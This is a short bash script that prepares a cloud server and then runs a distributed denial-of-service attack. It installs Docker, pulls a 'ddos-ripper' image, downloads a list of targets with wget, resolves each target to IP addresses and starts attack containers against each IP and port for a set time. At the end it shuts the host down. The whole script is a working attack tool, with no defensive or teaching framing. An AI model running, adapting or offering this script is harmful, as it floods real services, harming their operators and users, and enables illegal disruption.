# host init
sudo yum -y update
sudo yum search docker
sudo yum -y install docker
sudo systemctl start docker.service
# host init

# swop improvement
sudo fallocate -l 4G /swapfile
sudo dd if=/dev/zero of=/swapfile bs=1024 count=4194304
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
# swop improvement

IMAGE="dieputindie/ddos-ripper:latest"
sudo docker pull $IMAGE

if [ -s /tmp/links.txt ]; then
    echo "local links provided" && cat /tmp/links.txt
else
    echo "There is no local links.txt. Downloading"
    sudo rm /tmp/links.txt
    sudo wget $3 -P /tmp/
    cat /tmp/links.txt
fi

if file /tmp/links.txt | grep CRLF; then
    echo "/tmp/links.txt contains CRLF. Converting file"
    sudo vim /tmp/links.txt -c "set ff=unix" -c ":wq"
fi

while read link; do
    while [ $(sudo docker ps | wc -l) -gt 4 ]; do
        sleep 60
    done
    echo "current link is $link"
    HOST=$(echo $link | awk -F ' ' '{print $1}')
    echo "digging " && sudo dig +short $HOST
    if [[ $HOST =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo $HOST >/tmp/ips.txt
    else
        sudo dig +short $HOST >/tmp/ips.txt
    fi

    cat /tmp/ips.txt
    while read ip; do
        echo "Current target is $ip"
        THIS_HOSTNAME=$(echo $ip | awk -F ' ' '{print $1}')
        THIS_PORT=$(echo $link | awk -F ' ' '{print $2}')
        sudo docker stop -t $1 $(sudo docker run -e THIS_HOSTNAME=$THIS_HOSTNAME -e THIS_PORT=$THIS_PORT -e ENABLE_LOG=$2 -d --stop-signal 2 $IMAGE) &
        sleep 5
    done </tmp/ips.txt

done </tmp/links.txt
sleep $1 # waiting attack time after last links started, before server shutdown
sudo shutdown now
